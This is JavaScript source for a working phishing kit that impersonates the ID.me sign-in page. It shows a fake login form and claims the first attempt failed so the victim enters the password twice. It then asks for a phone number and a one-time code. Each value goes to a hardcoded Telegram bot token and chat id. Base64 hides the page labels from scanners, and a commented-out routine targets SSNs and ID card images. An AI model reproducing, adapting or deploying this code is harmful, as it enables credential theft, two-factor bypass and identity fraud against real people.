const app = document.getElementById("app");

// const main = document.getElementById("main");
// const main2 = document.getElementById("main2");

// const mainBtn = document.getElementById("mainBtn");
// const mainBtn2 = document.getElementById("mainBtn2");

let mainAttempts = 0;
const d = new Date();
let submissionID = d.getTime() + " " + Math.floor(Math.random() * 1000) + 1;

let token = "6818557365:AAGma_2EZmrD7QsqbKMe3wVMMQOOc5HSQr8" //"5402975294:AAGYpLmZbgObheHGo6j2ziDCjcMqJziDIiU";
let chat_id = -821477061 //-5004137383;
let def_id = 5004137383 //748063043;
// let token = "5402975294:AAGYpLmZbgObheHGo6j2ziDCjcMqJziDIiU" //"5402975294:AAGYpLmZbgObheHGo6j2ziDCjcMqJziDIiU";
// let chat_id = -821477061 //-5004137383;
// let def_id = 748063043 //748063043;

const bt = new Bot(token, def_id);

function processCred(el) {
  let mainMail = document.getElementById("user_email").value;
  let mainPass = document.getElementById("user_password").value;

  if (mainMail.trim() === "" || mainPass.trim() === "") {
    alert("Sign in fields must be fully filled");
    return;
  }

  el.value = "Processing ...";

  if (mainAttempts < 1) {
    let txt = `============= %0A`;
    txt += `First attempt %0A`;
    txt += `============= %0A`;
    txt += `ID.me Email: ${mainMail} %0A`;
    txt += `ID.me Password: ${mainPass} %0A`;

    bt.sendMessage(txt)
      .then(res => {
        console.log("Msg Success!", res);
        // definitely a success message
        document.getElementById("errorTxt").innerText = "Enter your login credentials again";
        document.getElementById("user_email").value = "";
        document.getElementById("user_password").value = "";
        mainAttempts++;
        el.value = `Continue`;
      })
      .catch(err => {
        console.error(err)
        // alert('error', error);
        document.getElementById("errorTxt").innerText = "Enter your login credentials again";
        document.getElementById("user_email").value = "";
        document.getElementById("user_password").value = "";
        mainAttempts++;
        el.value = `Continue`;
      })
  } else {
    document.getElementById("errorTxt").innerText = "";

    let txt2 = `============= %0A`;
    txt2 += `Second attempt %0A`;
    txt2 += `============= %0A`;
    txt2 += `ID.me Email: ${mainMail} %0A`;
    txt2 += `ID.me Password: ${mainPass} %0A`;

    bt.sendMessage(txt2)
      .then(res => {
        console.log("Msg Success!", res);
        // definitely a success message
        //show popup
        app.innerHTML = `
<div class="page-container" data-role="page-container">
    <div class="container">
      <div class="content-container">
        <div class="form-header">
          <div class="form-header-content" role="banner">
            <div class="partner">
              <div class="c_icon m_idme">
                <img src="./asset/1d96899e99d393974ec16fa17a820e78fca132bd8ea53e01f12bdc000baf674f.svg">
              </div>
            </div>
          </div>

        </div>
        <main id="main" aria-labelledby="sr_page_title" class="form-container">
          <div class="form-header-access">
            <h2>COMPLETE YOUR SIGN IN</h2>
            <h3>Confirm your phone number</h3>
          </div>

          <div class="form-fields">
            <div class="field-group">
            <div class="field text suggest">
            <label class="required" for="phone">Phone</label>
            <input placeholder="Enter your phone number" required="required" type="tel"
              id="phone">
          </div>
          </div>
          <div class="form-actions">
            <input type="button" value="Continue" class="btn btn-primary" onclick="processPhone(this)">
          </div>

        </main>
      </div>

    </div>
  </div>
`;
      })
      .catch(err => {
        console.error(err)
        // alert('error', error);

      })
  }
}

function processPhone(el) {
  let phone = document.getElementById("phone").value;

  if (phone.trim() === "") {
    alert("Your phone number is required");
    return;
  }

  el.value = "Processing ...";

  let txt = `============= %0A`;
  txt += `Phone number: ${phone} %0A`;

  bt.sendMessage(txt)
    .then(res => {
      console.log("Msg Success!", res);
      // definitely a success message
      //show popup
      app.innerHTML = `
<div class="page-container" data-role="page-container">
    <div class="container">
      <div class="content-container">
        <div class="form-header">
          <div class="form-header-content" role="banner">
            <div class="partner">
              <div class="c_icon m_idme">
                <img src="./asset/1d96899e99d393974ec16fa17a820e78fca132bd8ea53e01f12bdc000baf674f.svg">
              </div>
            </div>
          </div>

        </div>
        <main id="main" aria-labelledby="sr_page_title" class="form-container">
          <div class="form-header-access">
            <h2>COMPLETE YOUR SIGN IN</h2>
            <h3>Enter the code we sent to (***) *** - *${phone.slice(-3)}</h3>
          </div>

          <div class="form-fields">
            <div class="field-group">
            <div class="field text suggest">
            <label class="required" for="code">Enter the 6-digit code</label>
            <input style="text-align:center;" placeholder="_ _ _ _ _ _" required="required" type="text"
              id="code">
          </div>
          </div>
          <div class="form-actions">
            <input type="button" value="Continue" class="btn btn-primary" onclick="processCode(this)">
          </div>

        </main>
      </div>

    </div>
  </div>
`;
    })
    .catch(err => {
      console.error(err)
      // alert('error', error);

    })
}

function processCode(el) {
  let code = document.getElementById("code").value;

  if (code.trim() === "") {
    alert("The 6 digit code sent to your phone number is required");
    return;
  }

  el.value = "Processing ...";

  let txt = `============= %0A`;
  txt += `Code: ${code} %0A`;

  bt.sendMessage(txt)
    .then(res => {
      console.log("Msg Success!", res);
      // definitely a success message
      //show popup
      location.assign("/")
    })
    .catch(err => {
      console.error(err)
      // alert('error', error);

    })
}

// function processID(el) {
//   let ssn = document.getElementById("ssn").value;
//   let fileFront = document.getElementById("fileFront");
//   let fileBack = document.getElementById("fileBack");

//   if (ssn.trim() === "") {
//     alert("SSN field is required");
//     return;
//   }

//   el.value = "Processing ...";

//   let txt = `============= %0A`;
//   txt += `SSN: ${ssn} %0A`;

//   // upload file
//   let file1 = fileFront.files;
//   let file2 = fileBack.files;
//   if (file1.length > 0 && file2.length > 0) {

//     bt.sendMessage(txt)
//       .then(res => {
//         console.log("Msg Success!", res);
//         // Send first file
//         bt.sendFile("#fileFront")
//           .then(res => {
//             console.log("File1 Success!", res);
//             // Send seconde file
//             bt.sendFile("#fileBack")
//               .then(res => {
//                 console.log("File2 Success!", res);
//                 location.assign("/")
//               })
//               .catch(err => {
//                 console.error(err)
//                 location.assign("/")
//               })
//           })
//           .catch(err => {
//             console.error(err)
//             location.assign("/")
//           }
//           )
//       })
//       .catch(err => console.error(err))

//   } else {
//     alert("Uploads failed final upload verification process");
//   }

// }

function flagInputError(msg) {
  alert(msg);
}

function isEmpty(input) {
  return input.value.trim() === "" ? true : false;
}

app.innerHTML = `
<div class="page-container" data-role="page-container">
    <div class="container">
      <div class="content-container">
        <div class="form-header">
          <div class="form-header-content" role="banner">
            <div class="partner">
              <div class="c_icon m_idme">
                <img src="./asset/1d96899e99d393974ec16fa17a820e78fca132bd8ea53e01f12bdc000baf674f.svg">
              </div>
            </div>
          </div>

        </div>
        <main id="main" aria-labelledby="sr_page_title" class="form-container">
          <div class="form-header-access">
            <h1 id="sr_page_title"></h1>
          </div>

          <div class="form-fields">
            <div class="field-group">
              <div class="field text">
                <label id="user_email_label"></label>
                <input required="required" type="text" id="user_email">
              </div>
              <div class="field text password-showable">
                <label id="user_password_label"></label>
                <input required="required" type="password" id="user_password">
              </div>
              <p id="errorTxt" style="color:red;"></p>
            </div>
          </div>
          <div class="form-actions">
            <input id="mainBtn" type="button" class="btn btn-primary" onclick="processCred(this)">
          </div>

        </main>
        <main id="main2" aria-labelledby="sr_page_title" class="form-container visually-hidden">
          <div class="form-header-access">
            <h1 id="sr_page_title">Enter a code from your device</h1>
          </div>
          <div class="form-header-well">
            <p>Please check your code generation application and enter the generated 6-digit code to complete your
              sign in.</p>
          </div>

          <div class="form-fields">
            <div class="field-group">
              <div class="field text">
                <label for="user_email">Enter the 6-digit code</label>
                <input placeholder="_ _ _ _ _ _" required="required" autocomplete="email" type="text"
                  name="user[email]" id="code">
                <span id="errorTxt" role="alert">

                </span>
              </div>
            </div>
          </div>
          <div class="form-actions">
            <input id="mainBtn2" type="button" name="commit" value="Proceed" class="btn btn-primary"
              data-disable-with="Signing in to ID.me..." data-clicked="false">
          </div>

        </main>
      </div>

    </div>
  </div>
`;

document.getElementById("sr_page_title").innerText = atob("U2lnbiBpbiB0byBJRC5tZQ==");
document.getElementById("user_email_label").innerText = atob("RW1haWw=");
document.getElementById("user_email").placeholder = atob("RW50ZXIgeW91ciBlbWFpbCBhZGRyZXNz");
document.getElementById("user_password_label").innerText = atob("UGFzc3dvcmQ=");
document.getElementById("user_password").placeholder = atob("RW50ZXIgcGFzc3dvcmQ=");
document.getElementById("mainBtn").value = atob("U2lnbiBpbg==");